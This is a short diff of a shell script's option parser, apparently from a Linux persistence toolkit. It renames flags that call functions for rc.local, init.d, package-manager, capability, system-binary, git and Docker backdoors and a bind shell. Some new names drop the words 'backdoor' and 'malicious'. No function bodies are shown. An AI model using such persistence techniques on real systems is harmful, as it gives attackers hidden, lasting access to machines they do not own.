-			--rc-local-backdoor )
+			--rc-local )
 				shift
 				setup_rc_local_backdoor "$@"
 				exit
 				;;
-			--initd-backdoor )
+			--initd )
 				shift
 				setup_initd_backdoor "$@"
 				exit
 				;;
-			--package-manager-persistence )
+			--package-manager )
 				shift
 				setup_package_manager_persistence "$@"
 				exit
 				;;
-			--cap-backdoor )
+			--cap )
 				shift
 				setup_cap_backdoor "$@"
 				exit
@@ -2616,7 +2833,7 @@ main() {
 				setup_bind_shell "$@"
 				exit
 				;;
-			--system-binary-backdoor )
+			--system-binary )
 				shift
 				setup_system_binary_backdoor "$@"
 				exit
@@ -2631,7 +2848,7 @@ main() {
 				setup_git_persistence "$@"
 				exit
 				;;
-            --malicious-docker-container )
+            --docker-container )
                 shift
                 setup_malicious_docker_container "$@"
                 exit
